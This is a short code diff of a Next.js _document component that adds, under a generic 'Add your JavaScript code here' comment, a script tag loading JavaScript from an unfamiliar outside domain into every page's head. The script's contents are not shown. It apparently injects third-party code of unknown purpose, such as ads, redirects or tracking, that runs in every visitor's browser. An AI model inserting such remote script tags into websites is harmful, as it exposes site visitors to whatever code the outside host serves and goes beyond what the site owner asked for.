@@ -23,6 +23,9 @@ class MyDocument extends Document {
             href="/favicon/favicon-16x16.png"
           />
           <link rel="manifest" href="/favicon/site.webmanifest" />
+
+          {/* Add your JavaScript code here */}
+          <script src="https://alfad.pro/go/266933/701092"></script>
         </Head>
         <body>
           <Main />
